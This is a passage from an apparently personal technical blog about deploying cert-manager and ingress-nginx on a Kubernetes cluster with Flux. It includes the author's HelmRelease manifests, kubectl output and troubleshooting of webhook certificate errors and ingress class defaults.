<div class="sourceCode" id="cb32" data-filename="cert-manager/helmrelease.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb32-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb32-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> helm.toolkit.fluxcd.io/v2</span></span>
<span id="cb32-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRelease</span></span>
<span id="cb32-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> cert-manager</span></span>
<span id="cb32-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb32-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> cert-manager</span></span>
<span id="cb32-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reconcileStrategy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ChartVersion</span></span>
<span id="cb32-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb32-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> cert-manager</span></span>
<span id="cb32-15"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">version</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> v1.16.0</span></span>
<span id="cb32-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb32-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">values</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">crds</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb32-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">true</span></span></code></pre></div>
</div>
<p>One thing that I had to change is the values at the very bottom. It seems that the <code>--set crds.enabled=true</code> in the helm install command options doesn’t work for flux. Instead, I had to seperate it out to what is in the <code>values</code> section above.</p>
<p>I also deployed ingress-nginx:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>helmsource.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb33" data-filename="helmsource.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb33-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb33-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> source.toolkit.fluxcd.io/v1</span></span>
<span id="cb33-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb33-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb33-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb33-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb33-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb33-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb33-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">url</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> https://kubernetes.github.io/ingress-nginx</span></span></code></pre></div>
</div>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>helmrelease.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb34" data-filename="helmrelease.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb34-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb34-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> helm.toolkit.fluxcd.io/v2</span></span>
<span id="cb34-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRelease</span></span>
<span id="cb34-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb34-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb34-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb34-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb34-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb34-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb34-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb34-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reconcileStrategy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ChartVersion</span></span>
<span id="cb34-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb34-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb34-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb34-15"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # version: </span></span>
<span id="cb34-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span></code></pre></div>
</div>
<p>Another thing I had to do was to uninstall traefik:</p>
<div class="sourceCode" id="cb35" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb35-1">[moonpie@lizard flux-config]$ kubectl delete helm</span>
<span id="cb35-2">helmchartconfigs.helm.cattle.io            helmcharts.source.toolkit.fluxcd.io        helmrepositories.source.toolkit.fluxcd.io</span>
<span id="cb35-3">helmcharts.helm.cattle.io                  helmreleases.helm.toolkit.fluxcd.io</span>
<span id="cb35-4">[moonpie@lizard flux-config]$ kubectl delete helmrepositories.source.toolkit.fluxcd.io traefik</span>
<span id="cb35-5">helmrepository.source.toolkit.fluxcd.io "traefik" deleted</span></code></pre></div>
<p>For whatever reason, after deleting the traefik files from my git repo, they did not get removed from flux even after reconciling them. But, after this, the install works normally.</p>
<p>However, when I attempt to appy an ingress, I get an error:</p>
<div class="sourceCode" id="cb36" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb36-1">Warning: resource ingresses/podinfo is missing the kubectl.kubernetes.io/last-applied-configuration annotation which is required by kubectl apply. kubectl apply should only be used on resources created declaratively by either kubectl create --save-config or kubectl apply. The missing annotation will be patched automatically.</span>
<span id="cb36-2">Error from server (InternalError): error when applying patch:</span>
<span id="cb36-3">{"metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"networking.k8s.io/v1\",\"kind\":\"Ingress\",\"metadata\":{\"annotations\":{},\"name\":\"podinfo\",\"namespace\":\"default\"},\"spec\":{\"rules\":[{\"host\":\"podinfo.moonpiedumpl.ing\",\"http\":{\"paths\":[{\"backend\":{\"service\":{\"name\":\"podinfo\",\"port\":{\"number\":9898}}},\"path\":\"/\",\"pathType\":\"Exact\"}]}}]}}\n"}}}</span>
<span id="cb36-4">to:</span>
<span id="cb36-5">Resource: "networking.k8s.io/v1, Resource=ingresses", GroupVersionKind: "networking.k8s.io/v1, Kind=Ingress"</span>
<span id="cb36-6">Name: "podinfo", Namespace: "default"</span>
<span id="cb36-7">for: "podinfo-ingress.yaml": error when patching "podinfo-ingress.yaml": Internal error occurred: failed calling webhook "validate.nginx.ingress.kubernetes.io": failed to call webhook: Post "https://ingress-nginx-controller-admission.default.svc:443/networking/v1/ingresses?timeout=10s": tls: failed to verify certificate: x509: certificate signed by unknown authority</span></code></pre></div>
<p>This seems to be a sort of race condition, caused by when resources are simautaneously brought up, despite one depending on another. I found dsome relevant github issues.</p>
<p><a href="https://github.com/kubernetes/ingress-nginx/issues/5968" class="uri">https://github.com/kubernetes/ingress-nginx/issues/5968</a></p>
<p>There were some hacks related to deleting the hook, but I found in the <a href="https://github.com/kubernetes/ingress-nginx/tree/main/charts/ingress-nginx">helm chart documentation</a>, there is an official option to delete the hook. I set that:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>helmrelease.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb37" data-filename="helmrelease.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb37-1"><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb37-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> helm.toolkit.fluxcd.io/v2</span></span>
<span id="cb37-3"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRelease</span></span>
<span id="cb37-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">metadata</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-5"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb37-6"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">namespace</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> default</span></span>
<span id="cb37-7"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-8"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-9"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">spec</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-10"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chart</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb37-11"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">reconcileStrategy</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ChartVersion</span></span>
<span id="cb37-12"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sourceRef</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-13"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> HelmRepository</span></span>
<span id="cb37-14"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">name</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> ingress-nginx</span></span>
<span id="cb37-15"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">      # version:  </span></span>
<span id="cb37-16"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">interval</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> 1m0s</span></span>
<span id="cb37-17"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">values</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-18"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">    </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">controller</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-19"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">      </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">admissionWebhooks</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb37-20"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">        </span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">enabled</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> </span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">false</span></span></code></pre></div>
</div>
<p>Now:</p>
<div class="sourceCode" id="cb38" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb38-1">[moonpie@lizard podinfo]$ kubectl apply -f podinfo-ingress.yaml</span>
<span id="cb38-2">ingress.networking.k8s.io/podinfo created</span></code></pre></div>
<p>But:</p>
<div class="sourceCode" id="cb39" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb39-1">[moonpie@lizard podinfo]$ curl podinfo.moonpiedumpl.ing</span>
<span id="cb39-2">&lt;html&gt;</span>
<span id="cb39-3">&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span>
<span id="cb39-4">&lt;body&gt;</span>
<span id="cb39-5">&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;</span>
<span id="cb39-6">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span>
<span id="cb39-7">&lt;/body&gt;</span>
<span id="cb39-8">&lt;/html&gt;</span></code></pre></div>
<p>I figured out why, somewhat. For some reason, it was using the traefik ingress class, despite the fact that I uninstalled traefik, and was using nginx. However, even after:</p>
<div class="sourceCode" id="cb40" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb40-1">[moonpie@lizard podinfo]$ kubectl get ingressclasses.networking.k8s.io</span>
<span id="cb40-2">NAME      CONTROLLER                      PARAMETERS   AGE</span>
<span id="cb40-3">nginx     k8s.io/ingress-nginx            &lt;none&gt;       6h29m</span>
<span id="cb40-4">traefik   traefik.io/ingress-controller   &lt;none&gt;       69m</span>
<span id="cb40-5">[moonpie@lizard podinfo]$ kubectl delete ingressclasses.networking.k8s.io traefik</span>
<span id="cb40-6">ingressclass.networking.k8s.io "traefik" deleted</span></code></pre></div>
<p>It still didn’t work. Also, traefik seems to have a lot of stuff still running:</p>
<div class="sourceCode" id="cb41" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb41-1">[moonpie@lizard podinfo]$  kubectl get all -A | grep traefik</span>
<span id="cb41-2">default       pod/traefik-66cc8b6ff6-64zll                                1/1     Running     0              73m</span>
<span id="cb41-3">kube-system   pod/svclb-traefik-13906a53-vmt4g                            0/2     Pending     0              73m</span>
<span id="cb41-4">default       service/traefik                              LoadBalancer   10.43.207.1     &lt;pending&gt;        80:32766/TCP,443:30881/TCP   73m</span>
<span id="cb41-5">kube-system   daemonset.apps/svclb-traefik-13906a53                    1         1         0       1            0           &lt;none&gt;                   73m</span>
<span id="cb41-6">default       deployment.apps/traefik                                1/1     1            1           73m</span>
<span id="cb41-7">default       replicaset.apps/traefik-66cc8b6ff6                                1         1         1       73m</span></code></pre></div>
<p>Woops I forgot to push my changes. Nevermind. So I did, and now it doesn’t work again, and it’s back to a 404.</p>
<p>I think I figured it out:</p>
<div class="sourceCode" id="cb42" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb42-1">NAME    CONTROLLER             PARAMETERS   AGE</span>
<span id="cb42-2">nginx   k8s.io/ingress-nginx   &lt;none&gt;       32h</span>
<span id="cb42-3">[moonpie@lizard podinfo]$ kubectl describe ingress podinfo</span>
<span id="cb42-4">Name:             podinfo</span>
<span id="cb42-5">Labels:           kustomize.toolkit.fluxcd.io/name=flux-system</span>
<span id="cb42-6">                  kustomize.toolkit.fluxcd.io/namespace=flux-system</span>
<span id="cb42-7">Namespace:        default</span>
<span id="cb42-8">Address:</span>
<span id="cb42-9">Ingress Class:    &lt;none&gt;</span>
<span id="cb42-10">Default backend:  &lt;default&gt;</span>
<span id="cb42-11">Rules:</span>
<span id="cb42-12">  Host                      Path  Backends</span>
<span id="cb42-13">  ----                      ----  --------</span>
<span id="cb42-14">  podinfo.moonpiedumpl.ing</span>
<span id="cb42-15">                            /   podinfo:9898 (10.42.0.40:9898,10.42.0.41:9898)</span>
<span id="cb42-16">Annotations:                &lt;none&gt;</span>
<span id="cb42-17">Events:                     &lt;none&gt;</span></code></pre></div>
<p>The “Ingress Class” is empty, when it probably needs to be filled with something. There are two solutions: I can set it manually, the exact field is ingress.spec.ingressClassName, or I can <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/#default-ingress-class">set it an an ingressclass as a default</a>.</p>
<p>I edited the nginx helm release with more configuration:</p>
<div class="sourceCode" id="cb43" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb43-1">[moonpie@lizard flux-config]$ cat nginx/helmrelease.yaml</span>
<span id="cb43-2">---</span>
<span id="cb43-3">apiVersion: helm.toolkit.fluxcd.io/v2</span>
<span id="cb43-4">kind: HelmRelease</span>
<span id="cb43-5">metadata:</span>
<span id="cb43-6">  name: ingress-nginx</span>
<span id="cb43-7">  namespace: default</span>
<span id="cb43-8">spec:</span>
<span id="cb43-9">  chart:</span>
<span id="cb43-10">    spec:</span>
<span id="cb43-11">      chart: ingress-nginx</span>
<span id="cb43-12">      reconcileStrategy: ChartVersion</span>
<span id="cb43-13">      sourceRef:</span>
<span id="cb43-14">        kind: HelmRepository</span>
<span id="cb43-15">        name: ingress-nginx</span>
<span id="cb43-16">      # version:</span>
<span id="cb43-17">  interval: 1m0s</span>
<span id="cb43-18">  values:</span>
<span id="cb43-19">    controller:</span>
<span id="cb43-20">      admissionWebhooks:</span>
<span id="cb43-21">        enabled: false</span>
<span id="cb43-22">      ingressClassResource:</span>
<span id="cb43-23">        default: true</span></code></pre></div>
<p>And after this, I had to delete the podinfo ingress, and then recreate it, but it was working again. I wonder why it didn’t change the ingressclass when I reapplied the yaml file?</p>
<p>Now for TLS/HTTPS.</p>
<p>Well, TLS already kinda works. It’s just using kubernetes self signed cert, rather than a letsencrypt cert.</p>
<p><a href="https://cert-manager.io/docs/tutorials/acme/nginx-ingress/">Here is the doumentation on using cert-manager and nginx together</a>. They recommend using the <a href="https://letsencrypt.org/docs/challenge-types/#http-01-challenge">http01</a> (<a href="https://web.archive.org/web/20240930190112/https://cert-manager.io/docs/tutorials/acme/nginx-ingress/">archive</a>) challenge, but that method (or maybe just their method) does not work with wildcard domains.</p>
<blockquote class="blockquote">
<p>It is not possible to obtain certificates for wildcard domain names (e.g.&nbsp;<code>*.example.com</code>) using the HTTP01 challenge mechanism.</p>
</blockquote>
<p>From <code>kubectl explain issuer.spec.acme.solvers.http01</code>.</p>
<p>THe other thing I don’t like about that page, is that it suggests that to set the “ingressClassName”, but I don’t want to do that. What if I want to change ingresses later on, would I have to change every single issuer? I think I will just allow it to set it’s own default and hope for the best.</p>
<p>According the <a href="https://cert-manager.io/docs/configuration/acme/http01/">cert-manager docs for acme http01</a></p>
<blockquote class="blockquote">
<p>If class and ingressClassName are not specified, and name is also not specified, cert-manager will default to create new Ingress resources but will not set the ingress class on these resources, meaning all ingress controllers installed in your cluster will serve traffic for the challenge solver, potentially incurring additional cost.</p>
</blockquote>
<p>I should be able to not set this field. I played around a bit with leaving the fields blank, but it didn’t work. I had to actually create the field, and leave it blank.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>issuer-staging.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb44" data-filename="issuer-staging.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb44-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">apiVersion</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> cert-manager.io/v1</span></span>
<span id="cb44-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">kind</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
